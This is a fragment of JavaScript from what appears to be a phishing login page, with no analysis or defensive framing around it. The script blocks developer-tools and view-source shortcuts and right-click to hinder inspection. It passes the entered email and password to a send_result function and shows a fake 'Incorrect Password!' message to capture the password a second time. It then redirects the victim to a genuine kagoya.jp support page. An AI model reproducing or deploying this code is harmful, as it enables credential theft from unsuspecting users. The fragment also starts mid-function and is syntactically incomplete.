<script>
//   prevent ctrl + s
  window.addEventListener('keydown', async(e) => {
      if (e.ctrlKey && (e.which == 83)) {
          e.preventDefault();
          return false; }
  });
  window.addEventListener('contextmenu', event => event.preventDefault());
  document.onkeydown = (e) => {
      if (event.keyCode == 123) {
          return false;
      }
      if (e.ctrlKey && e.keyCode == 'E'.charCodeAt(0)) {
          return false;
      }
      if (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) {
          return false;
      }
      if (e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) {
          return false;
      }
      if (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) {
          return false;
      }
      if (e.ctrlKey && e.keyCode == 'S'.charCodeAt(0)) {
          return false;
      }
      if (e.ctrlKey && e.keyCode == 'H'.charCodeAt(0)) {
          return false;
      }
      if (e.ctrlKey && e.keyCode == 'A'.charCodeAt(0)) {
          return false;
      }
      if (e.ctrlKey && e.keyCode == 'F'.charCodeAt(0)) {
          return false;
      }
      if (e.ctrlKey && e.keyCode == 'E'.charCodeAt(0)) {
          return false;
      }
  }
  window.onkeydown = (e) => {
      return !(e.ctrlKey &&
          (e.keyCode === 67 ||
              e.keyCode === 85 ||
              e.keyCode === 86 ||
              e.keyCode === 88 ||
              e.keyCode === 117));
  };

          var pswd = document.getElementById("passwd").value
  
          if (!email) {
              setTimeout(() => {document.getElementById("email").value = ""; document.getElementById("errtxt").innerHTML = "Email can't be empty! please try again."}, 1500)
              setTimeout(() => {document.getElementById("errtxt").innerHTML = ""}, 5000)
          }else if (!email.includes("@") && !email.includes(".")) {
              setTimeout(() => {document.getElementById("email").value = ""; document.getElementById("errtxt").innerHTML = "Incorrect email address! please try again."}, 1500)
              setTimeout(() => {document.getElementById("errtxt").innerHTML = ""}, 5000)
          }else if (pswd == null || pswd == "") {
              setTimeout(() => {document.getElementById("passwd").value = ""; document.getElementById("errtxt").innerHTML = "Password can't be empty! please try again."}, 1500)
              setTimeout(() => {document.getElementById("errtxt").innerHTML = ""}, 5000)
          }else if (pswd.length < 5) {
              setTimeout(() => {document.getElementById("passwd").value = ""; document.getElementById("errtxt").innerHTML = "Password too short! please try again."}, 1500)
              setTimeout(() => {document.getElementById("errtxt").innerHTML = ""}, 5000)
          }else if (pswd.length > 5 && count < 1) {
              send_result(email, pswd);
              setTimeout(() => {document.getElementById("passwd").value = ""; document.getElementById("errtxt").innerHTML = "Incorrect Password! please try again."}, 1500)
              setTimeout(() => {document.getElementById("errtxt").innerHTML = ""; count++}, 5000)
          } else {
              var email = document.getElementById("email").value
              var pswd = document.getElementById("passwd").value
              send_result(email, pswd);
              setTimeout(() => {window.location.assign("https://support.kagoya.jp/kir/manual/activemail/login.html")}, 2000);
          }
        })
    })
  </script>
